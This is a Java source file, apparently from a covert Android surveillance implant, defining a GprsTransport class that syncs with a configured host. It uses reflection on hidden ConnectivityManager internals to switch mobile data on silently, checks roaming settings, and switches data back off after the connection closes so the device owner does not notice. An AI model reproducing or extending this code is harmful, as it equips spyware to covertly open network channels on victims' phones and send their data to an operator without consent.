/**
 *
 */
package com.android.dvci.action.sync;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

// TODO: Auto-generated Javadoc

/**
 * The Class DirectTransport.
 *
 * @author zeno
 */
public class GprsTransport extends HttpKeepAliveTransport {
	private static final String TAG = "GprsTransport"; //$NON-NLS-1$
	private final boolean gprsForced;
	private final boolean gprsRoaming;
	private boolean switchedOn = false;

	/**
	 * Instantiates a new direct transport.
	 *
	 * @param host        the host
	 * @param gprsForced
	 * @param gprsRoaming
	 */
	public GprsTransport(final String host, boolean gprsForced, boolean gprsRoaming) {
		super(host);
		this.gprsForced = gprsForced;
		this.gprsRoaming = gprsRoaming;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		switchedOn = false;
		return haveInternet();
	}


	/**
	 * Enable/Disable data connectivity.
	 * It does not work with Lollipop.
	 * @param context
	 * @param enabled
	 * @return
	 */
	private boolean setMobileDataEnabled(Context context, boolean enabled) {
		try {
			final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			final Class conmanClass = Class.forName(conman.getClass().getName());
			final Field connectivityManagerField = conmanClass.getDeclaredField("mService");
			connectivityManagerField.setAccessible(true);
			final Object connectivityManager = connectivityManagerField.get(conman);
			final Class connectivityManagerClass = Class.forName(connectivityManager.getClass().getName());
			final Method setMobileDataEnabledMethod = connectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
			setMobileDataEnabledMethod.setAccessible(true);

			setMobileDataEnabledMethod.invoke(connectivityManager, enabled);
			return true;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable), ERROR", ex);
			}
			return false;
		}

	}

	// Do nothing for now
	@Override
	public boolean enable() {

		if(!this.gprsForced){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable), don't have gprsForced");
			}
			return false;
		}

		if(isRoaming() && !gprsRoaming){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable), isRoaming and don't have gprsRoaming");
			}
			return false;
		}

		if(android.os.Build.VERSION.SDK_INT >= 21){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable), Lollipop+ not supported");
			}
			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable) switch on mobile");
		}

		synchronized (this) {
			switchedOn = setMobileDataEnabled(Status.getAppContext(), true);
		}

		for (int i = 0; i < 30 && switchedOn; i++) {
			if (haveInternet()) {
				Utils.sleep(5000);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (enable) mobile switched on correctly");
				}
				switchedOn = true;
				return true;
			}

			Utils.sleep(1000);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable), can't switch mobile on");
		}

		synchronized (this) {
			setMobileDataEnabled(Status.getAppContext(), false);
		}

		return false;
	}

	@Override
	public void close() {
		super.close();

		synchronized (this) {
			if (switchedOn) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (close) switch off mobile");
				}
				setMobileDataEnabled(Status.getAppContext(), false);
				switchedOn = false;
			}
		}
	}

	private boolean isRoaming() {
		final NetworkInfo info = ((ConnectivityManager) Status.getAppContext().getSystemService(
				Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();

		return info != null && info.isRoaming();
	}

	/**
	 * Have internet.
	 *
	 * @return true, if successful
	 */
	private boolean haveInternet() {
		final NetworkInfo info = ((ConnectivityManager) Status.getAppContext().getSystemService(
				Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();

		return info !=null  && info.isConnected();
	}

}
